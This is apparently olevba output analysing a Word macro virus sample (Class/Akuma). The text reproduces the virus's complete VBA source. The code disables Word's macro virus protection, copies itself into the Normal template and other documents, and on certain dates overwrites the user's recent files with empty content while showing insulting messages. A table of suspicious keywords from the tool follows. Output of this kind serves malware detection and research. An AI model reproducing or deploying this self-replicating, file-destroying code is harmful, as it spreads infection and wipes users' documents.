olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-f363eb69eb88afbb85491653e573211d8cd480e2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-f363eb69eb88afbb85491653e573211d8cd480e2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Borg7/5/99 6:26:26 AMgoat2Clippit
    On Error Resume Next
'Borg7/5/99 6:26:26 AMgoat2Clippit
    Application.EnableCancelKey = Not -1
'Borg7/5/99 6:26:26 AMgoat2Clippit
        .ConfirmConversions = False
'Borg7/5/99 6:26:26 AMgoat2Clippit
        .SaveNormalPrompt = False
'Borg7/5/99 6:26:26 AMgoat2Clippit
    Application.DisplayRecentFiles = True
'Borg7/5/99 6:26:26 AMgoat2Clippit
    Set bry = NormalTemplate.VBProject.VBComponents.Item(1)
'Borg7/5/99 6:26:26 AMgoat2Clippit
    db = AkumaClear(bry, "Private Sub Document_Open()")
'Borg7/5/99 6:26:26 AMgoat2Clippit
    db = AkumaClear(bry, "Private Function AkumaClear(DoveM, StartM)")
'Borg7/5/99 6:26:26 AMgoat2Clippit
    db = AkumaClear(bry, "Private Function AkumaInfect()")
'Borg7/5/99 6:26:26 AMgoat2Clippit
    db = AkumaClear(bry, "Sub Document_Open()")
'Borg7/5/99 6:26:26 AMgoat2Clippit
    db = AkumaClear(bry, "Private Sub Document_Close()")
'Borg7/5/99 6:26:26 AMgoat2Clippit
    db = AkumaClear(bry, "Private Function AkumaFind(DoveM, StartM)")
'Borg7/5/99 6:26:26 AMgoat2Clippit
    db = AkumaClear(bry, "Private Function AkumaWrite(StartM)")
'Borg7/5/99 6:26:26 AMgoat2Clippit
    db = AkumaClear(bry, "Sub Document_Close()")
'Borg7/5/99 6:26:26 AMgoat2Clippit
    SetAttr "c:\cont.dbl", vbNormal
'Borg7/5/99 6:26:26 AMgoat2Clippit
    Open "c:\cont.dbl" For Output As #1
'Borg7/5/99 6:26:26 AMgoat2Clippit
    db = AkumaWrite("Private Sub Document_Close()")
'Borg7/5/99 6:26:26 AMgoat2Clippit
    db = AkumaWrite("Private Function AkumaClear(DoveM, StartM)")
'Borg7/5/99 6:26:26 AMgoat2Clippit
    db = AkumaWrite("Private Function AkumaInfect()")
'Borg7/5/99 6:26:26 AMgoat2Clippit
    SetAttr "c:\cont.dbl", vbNormal
'Borg7/5/99 6:26:26 AMgoat2Clippit
    Kill "c:\cont.dbl"
'Borg7/5/99 6:26:26 AMgoat2Clippit
    If Int((6 * Rnd) + 1) < 3 Then
'Borg7/5/99 6:26:26 AMgoat2Clippit
            .Title = "Akuma Macro Carrier"
'Borg7/5/99 6:26:26 AMgoat2Clippit
            .Keywords = "Mary Bitch"
'Borg7/5/99 6:26:26 AMgoat2Clippit
        End With
'Borg7/5/99 6:26:26 AMgoat2Clippit
    If Left(ActiveDocument.Name, 8) <> "Document" Then
'Borg7/5/99 6:26:26 AMgoat2Clippit
    End If
'Borg7/5/99 6:26:26 AMgoat2Clippit
    On Error GoTo 0
'Borg7/5/99 6:26:26 AMgoat2Clippit

'Borg7/5/99 6:26:26 AMgoat2Clippit
'Akuma
'Borg7/5/99 6:26:26 AMgoat2Clippit
    If Day(Date) >= 16 And Day(Date) <= 18 Then
'Borg7/5/99 6:26:26 AMgoat2Clippit
            For c = 1 To Application.RecentFiles.Count
'Borg7/5/99 6:26:26 AMgoat2Clippit
                    Open Application.RecentFiles.Item(c).Path + "\" + Application.RecentFiles.Item(c) For Output As #1
'Borg7/5/99 6:26:26 AMgoat2Clippit
                    Close #1
'Borg7/5/99 6:26:26 AMgoat2Clippit
            Next c
'Borg7/5/99 6:26:26 AMgoat2Clippit
            MsgBox "Something wonderful has happened, your PC is alive and even better but some of your documents are infected by the Akuma virus." + Chr$(10) + "Mary is simply a bitch and you, " + Application.UserName + ", are a stupid jerk and lose some files." + Chr$(10) + "Have a nice day."
        End If
    End If
End Sub

Private Function AkumaFind(DoveM, StartM)
'Akuma
    flagaltro = False
    flagio = False
    For Count = 1 To DoveM.CodeModule.CountOfLines
        If LCase$(DoveM.CodeModule.Lines(Count, 1)) = LCase$(StartM) Then
            flagaltro = True
            flagio = False
            If Trim(DoveM.CodeModule.Lines(Count + 1, 1)) = "'Akuma" Then
                flagio = True
                flagaltro = False
                Exit For
            End If
        End If
    Next Count
    If flagaltro = True Then
        For Count = 1 To DoveM.CodeModule.CountOfLines
            If LCase$(DoveM.CodeModule.Lines(Count, 1)) = LCase$(StartM) Then Exit For
        Next Count
        AkumaFind = Count
    Else
        If flagio = False Then
            AkumaFind = "Akuma"
        End If
        If flagio = True Then
            AkumaFind = "Akuma Yes" + Str(Count)
        End If
    End If
End Function

Private Function AkumaClear(DoveM, StartM)
'Akuma
    Count = AkumaFind(DoveM, StartM)
    If Count <> "Akuma" And Count <> "Akuma Yes" Then
        Do Until DoveM.CodeModule.Lines(Count, 1) = "End Sub" Or DoveM.CodeModule.Lines(Count, 1) = "End Function"
            DoveM.CodeModule.DeleteLines (Count)
        Loop
        DoveM.CodeModule.DeleteLines (Count)
    End If
End Function

Private Function AkumaWrite(StartM)
'Akuma
    Count = AkumaFind(MacroContainer.VBProject.VBComponents.Item(1), StartM)
    If Count <> "Akuma" Then
        If Left(Count, Len("Akuma Yes")) = "Akuma Yes" Then
            Count = Val(Right(Count, Len(Count) - Len("Akuma Yes")))
        End If
        Do Until MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(Count, 1) = "End Sub" Or MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(Count, 1) = "End Function"
            stress = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(Count, 1)
            Print #1, stress
            Count = Count + 1
        Loop
        Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(Count, 1)
        Print #1, ""
    End If
End Function

Private Function AkumaInfect()
'Akuma
    If AkumaFind(NormalTemplate.VBProject.VBComponents.Item(1), "Private Sub Document_Open()") = "Akuma" Then
        Set bry = NormalTemplate.VBProject.VBComponents.Item(1)
        flag = True
    ElseIf AkumaFind(ActiveDocument.VBProject.VBComponents.Item(1), "Private Sub Document_Open()") = "Akuma" Then
        Set bry = ActiveDocument.VBProject.VBComponents.Item(1)
        flag = True
    Else
        flag = False
    End If
    If flag = True Then
        Open "c:\cont.dbl" For Input As #2
        If LOF(2) = 0 Then GoTo cpyvir
        Count = 1
        Do While Not EOF(2)
            Line Input #2, stress
            bry.CodeModule.InsertLines Count, stress
            Count = Count + 1
        Loop
cpyvir: Close #2
    End If
End Function

Sub AutoOpen()
'Administrator06/09/99 14.46.10Xerox DocuPrint 4512 on LPT1:HOT LINE WK28Clippy
On Error GoTo out
'Administrator06/09/99 14.46.10Xerox DocuPrint 4512 on LPT1:HOT LINE WK28Clippy
Options.VirusProtection = False
'Administrator06/09/99 14.46.10Xerox DocuPrint 4512 on LPT1:HOT LINE WK28Clippy
Options.SaveNormalPrompt = False
'Administrator06/09/99 14.46.10Xerox DocuPrint 4512 on LPT1:HOT LINE WK28Clippy
Options.ConfirmConversions = False
'Administrator06/09/99 14.46.10Xerox DocuPrint 4512 on LPT1:HOT LINE WK28Clippy
ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'Administrator06/09/99 14.46.10Xerox DocuPrint 4512 on LPT1:HOT LINE WK28Clippy
nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'Administrator06/09/99 14.46.10Xerox DocuPrint 4512 on LPT1:HOT LINE WK28Clippy
If nt > 70 And ad > 0 Then GoTo out
'Administrator06/09/99 14.46.10Xerox DocuPrint 4512 on LPT1:HOT LINE WK28Clippy
If nt < 70 Then
'Administrator06/09/99 14.46.10Xerox DocuPrint 4512 on LPT1:HOT LINE WK28Clippy
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Administrator06/09/99 14.46.10Xerox DocuPrint 4512 on LPT1:HOT LINE WK28Clippy
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Administrator06/09/99 14.46.10Xerox DocuPrint 4512 on LPT1:HOT LINE WK28Clippy
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Administrator06/09/99 14.46.10Xerox DocuPrint 4512 on LPT1:HOT LINE WK28Clippy
End If
'Administrator06/09/99 14.46.10Xerox DocuPrint 4512 on LPT1:HOT LINE WK28Clippy
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Administrator06/09/99 14.46.10Xerox DocuPrint 4512 on LPT1:HOT LINE WK28Clippy
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'Administrator06/09/99 14.46.10Xerox DocuPrint 4512 on LPT1:HOT LINE WK28Clippy
host.CodeModule.AddFromFile ("c:\class.sys")
'Administrator06/09/99 14.46.10Xerox DocuPrint 4512 on LPT1:HOT LINE WK28Clippy
With host.CodeModule
'Administrator06/09/99 14.46.10Xerox DocuPrint 4512 on LPT1:HOT LINE WK28Clippy
    For x = 1 To 4
'Administrator06/09/99 14.46.10Xerox DocuPrint 4512 on LPT1:HOT LINE WK28Clippy
    .DeleteLines 1
'Administrator06/09/99 14.46.10Xerox DocuPrint 4512 on LPT1:HOT LINE WK28Clippy
    Next x
'Administrator06/09/99 14.46.10Xerox DocuPrint 4512 on LPT1:HOT LINE WK28Clippy
End With
'Administrator06/09/99 14.46.10Xerox DocuPrint 4512 on LPT1:HOT LINE WK28Clippy
If nt < 70 Then
'Administrator06/09/99 14.46.10Xerox DocuPrint 4512 on LPT1:HOT LINE WK28Clippy
    With host.CodeModule
'Administrator06/09/99 14.46.10Xerox DocuPrint 4512 on LPT1:HOT LINE WK28Clippy
    .replaceline 1, "Sub AutoClose()"
'Administrator06/09/99 14.46.10Xerox DocuPrint 4512 on LPT1:HOT LINE WK28Clippy
    .replaceline 71, "Sub ToolsMacro()"
'Administrator06/09/99 14.46.10Xerox DocuPrint 4512 on LPT1:HOT LINE WK28Clippy
    End With
'Administrator06/09/99 14.46.10Xerox DocuPrint 4512 on LPT1:HOT LINE WK28Clippy
End If
'Administrator06/09/99 14.46.10Xerox DocuPrint 4512 on LPT1:HOT LINE WK28Clippy
With host.CodeModule
'Administrator06/09/99 14.46.10Xerox DocuPrint 4512 on LPT1:HOT LINE WK28Clippy
    For x = 2 To 72 Step 2
'Administrator06/09/99 14.46.10Xerox DocuPrint 4512 on LPT1:HOT LINE WK28Clippy
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
'Administrator06/09/99 14.46.10Xerox DocuPrint 4512 on LPT1:HOT LINE WK28Clippy
    Next x
'Administrator06/09/99 14.46.10Xerox DocuPrint 4512 on LPT1:HOT LINE WK28Clippy
End With
'Administrator06/09/99 14.46.10Xerox DocuPrint 4512 on LPT1:HOT LINE WK28Clippy
out:
'Administrator06/09/99 14.46.10Xerox DocuPrint 4512 on LPT1:HOT LINE WK28Clippy
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Administrator06/09/99 14.46.10Xerox DocuPrint 4512 on LPT1:HOT LINE WK28Clippy
End Sub
'Administrator06/09/99 14.46.10Xerox DocuPrint 4512 on LPT1:HOT LINE WK28Clippy
Sub ViewVBCode()
'Administrator06/09/99 14.46.10Xerox DocuPrint 4512 on LPT1:HOT LINE WK28Clippy
End Sub


Private Sub OptionButton1_Click()

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |OptionButton1_Click |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
